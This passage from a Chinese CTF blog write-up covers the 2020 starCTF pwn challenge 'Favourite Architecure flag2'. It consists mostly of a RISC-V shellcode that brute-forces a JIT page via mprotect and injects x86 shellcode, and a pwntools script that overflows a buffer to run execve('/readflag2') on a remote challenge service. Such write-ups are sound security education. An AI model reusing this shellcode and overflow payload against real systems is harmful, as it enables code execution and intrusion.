<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># riscv64-linux-gnu-as orw_flag2.asm -o orw_flag2</span><br><span class="line"># riscv64-linux-gnu-objcopy -S -O binary -j .text orw_flag2 orw_flag2.bin</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">	li a3, 0x7f0000000000 # base</span><br><span class="line">	li a4, 0x000004000000 # inc</span><br><span class="line">	li a5, 0xf000 # offset</span><br><span class="line">loop:</span><br><span class="line">	add a0, a3, a5 </span><br><span class="line">	li a1, 0x1000</span><br><span class="line">	li a2, 7</span><br><span class="line">	li a7, 226 # mprotect</span><br><span class="line">	ecall</span><br><span class="line"></span><br><span class="line">	beq a0, zero, succ </span><br><span class="line">	add a3, a3, a4 </span><br><span class="line">	j loop </span><br><span class="line"></span><br><span class="line">succ:</span><br><span class="line">	# try output a3</span><br><span class="line">	li a1, 0x6f200</span><br><span class="line">	sd a3, 0(a1)</span><br><span class="line">	li a0, 1</span><br><span class="line">	li a2, 0x10</span><br><span class="line">	li a7, 64 # write</span><br><span class="line">	ecall</span><br><span class="line">	# rwx page at a3</span><br><span class="line">	# read(0, a3, 0x200)</span><br><span class="line">	li a0, 0</span><br><span class="line">	li a1, 0x6f200 # x86 sc buf</span><br><span class="line">	li a2, 0x200</span><br><span class="line"></span><br><span class="line">	li a7, 63 # read</span><br><span class="line">	ecall </span><br><span class="line"></span><br><span class="line">	# copy from 0x70000 to a3</span><br><span class="line">	addi a3, a3, 0x200 #22c</span><br><span class="line">	addi a1, a1, 0x200</span><br><span class="line">	li a2, 0x80</span><br><span class="line">copy:</span><br><span class="line">	ld a5, 0(a1)</span><br><span class="line">	sd a5, 0(a3)</span><br><span class="line">	addi a1, a1, -4 </span><br><span class="line">	addi a3, a3, -4 </span><br><span class="line">	beq a2, zero,  finish</span><br><span class="line">	addi a2, a2, -1 </span><br><span class="line">	j copy</span><br><span class="line"></span><br><span class="line">finish:</span><br><span class="line">	li a7, 93 # exit</span><br><span class="line">	ecall</span><br></pre></td></tr></table></figure>

<p>这段<code>shellcode</code>的作用就是爆破出<code>jit code page address</code>之后，调用<code>read</code>读取我们输入的<code>execve(&quot;/readflag2&quot;) x86 shellcode</code>到<code>bss</code>段中，之后将其拷贝到<code>jit code page</code>中。完成之后即可调用我们输入的<code>x86 shellcode</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./main&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-riscv64&quot;</span>, file_path])</span><br><span class="line">    <span class="comment"># p = process([&quot;./qemu-riscv64&quot;, &quot;-g&quot;, &quot;1234&quot;, file_path])</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># p = remote(&#x27;119.28.89.167&#x27;, 60001)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;172.22.0.1&#x27;</span>, <span class="number">60001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0006edb0</span></span><br><span class="line">call_read = <span class="number">0x00010442</span></span><br><span class="line">nop = p32(<span class="number">0x00000013</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input the flag: &quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x118</span> + p64(bss + <span class="number">0x128</span>) + p64(call_read)</span><br><span class="line">payload += cyclic(<span class="number">0x1f8</span>) + p64(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">open</span>(<span class="string">&quot;orw_flag2.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;You are wrong ._.\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;You are wrong ._.\n&quot;</span>)</span><br><span class="line">jit_code_address = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">&quot;jit code address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(jit_code_address)))</span><br><span class="line"></span><br><span class="line">orw_flag2 = <span class="string">b&quot;\x90&quot;</span>*<span class="number">0x100</span></span><br><span class="line">orw_flag2 += asm(shellcraft.linux.execve(<span class="string">&quot;/readflag2&quot;</span>) + shellcraft.linux.exit())</span><br><span class="line"></span><br><span class="line">orw_flag2 = orw_flag2.ljust(<span class="number">0x200</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(orw_flag2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/922614085.html">https://www.lyyl.online/posts/922614085.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-55.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/103439762.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-69.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Adobe漏洞CVE-2018-4490分析</div></div></a></div><div class="next-post pull-right"><a href="/posts/882088222.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-31.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2019-6788-Qemu逃逸漏洞复现-分析</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-text">babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babypac"><span class="toc-text">babypac</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pointer-Authentication-Code-PAC%E6%9C%BA%E5%88%B6"><span class="toc-text">Pointer Authentication Code, PAC机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babygame"><span class="toc-text">babygame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Favourite-Architecure-flag1"><span class="toc-text">Favourite Architecure flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Favourite-Architecure-flag2"><span class="toc-text">Favourite Architecure flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#riscv%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">riscv交叉编译环境搭建</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/922614085.html'
    this.page.identifier = 'posts/922614085.html'
    this.page.title = '2020 starCTF 部分pwn WriteUp'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>